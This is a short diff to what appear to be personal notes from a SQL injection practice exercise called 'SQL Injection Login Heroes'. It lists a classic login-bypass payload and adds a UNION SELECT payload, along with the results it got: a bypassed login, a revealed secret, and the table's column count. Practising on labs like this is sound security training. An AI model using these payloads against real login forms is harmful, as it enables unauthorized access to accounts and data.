@@ -2,3 +2,6 @@ SQL Injection Login Heroes
 
 test' or 1=1-- 
 result: bypasses login for Neo
+
+testing' UNION SELECT 1,1,1,1-- 
+result: welcomes user 1 and displays sercret 1. We also know the table has four columns
